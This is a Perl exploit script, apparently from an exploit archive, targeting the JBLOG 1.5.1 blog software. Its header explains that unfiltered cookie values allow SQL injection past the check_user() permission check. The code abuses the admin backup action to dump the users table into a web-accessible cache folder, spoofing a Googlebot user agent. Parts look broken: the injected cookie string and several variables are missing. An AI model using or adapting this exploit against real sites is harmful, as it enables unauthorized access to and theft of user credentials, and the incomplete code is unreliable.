JBLOG 1.5.1 Remote SQL Table Backup Exploit
===========================================


#!/usr/bin/perl

=about

 VENDOR
    JBLOG 1.5.1
    (maybe earlier versions vulnerable too)
    http://www.lisijie.org

 AUTHOR
    discovered & written by Ams

 VULNERABILITY DESCRIPTION
    Both &#039;index.php&#039; and &#039;admin.php&#039; includes file &#039;common.php&#039; which checks
    for user permission on line 81 via function &#039;check_user()&#039;.
    This function is defined in file &#039;include/func_user.php&#039;.
    There is another one function - &#039;get_cookie()&#039; which gets cookie values.
    So, in cookies we put our evil string and further actions should be clear.

    Why we don&#039;t filter COOKIEs ?

 EXPLOIT WORK
    This exploit uses SQL-injection to create dump of users table.
    Actually, we are possible to do all administrator actions.

 REQUIREMENTS
    But there is no problem to find it out.
    2. Rights to write to &#039;cache/&#039; folder.

=cut

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Request::Common;
use MIME::Base64;
use Getopt::Long;

Banner();
$| = 1;

my $expl_url;
my $proxy  = &#039;&#039;;

GetOptions(
    &#039;u=s&#039;   => \$expl_url,
    &#039;p=s&#039;   => \$proxy,
) or Usage();

my $spider = LWP::UserAgent->new;
$spider->agent(&#039;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&#039;);
$spider->proxy([&#039;http&#039;], "http://$proxy/") if $proxy ne &#039;&#039;;
$spider->timeout( 30 );

Exploit( $expl_url);

sub Exploit {

    $_ = shift || Usage();
    print "\n\tExploiting:\t $_";

    my ($prot , $host, $path, )
        = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};
    $prot ||= &#039;http&#039;;

    my $url    = "$prot://$host$path";
    my $defact = &#039;admin.php?ac=data&do=bakout&dosubmit=yes&sizelimit=2048&#039;;

    my $res = $spider->request( $req );

    #   Second request to dump table
    $res = $spider->request( $req );

    #   Finally checking if sql backup exists
    $req = HEAD "$url/cache/backup/$dir/${file}_1.sql";
    $res = $spider->request( $req );    

    if ( $res->is_success ) {
        print "\n\tLooks ok, check $prot://$host${path}cache/backup/$dir/${file}_1.sql\n";
    } else {
        printf(
            "\n\tFailure, server response: %s\n\tAnyway, check: %s\n",
            $res->status_line, "$prot://$host${path}cache/backup/$dir/${file}_1.sql");
    }
}

sub Usage {

    print <<USAGE;

        Usage:
        -u     Set url of victim
            optional:
        -p     Proxy, set as ip:port

        Example:

USAGE

    exit;
}

sub Banner {

    print <<BANNER;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          JBLOG 1.5.1 Perl exploit
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
BANNER

}



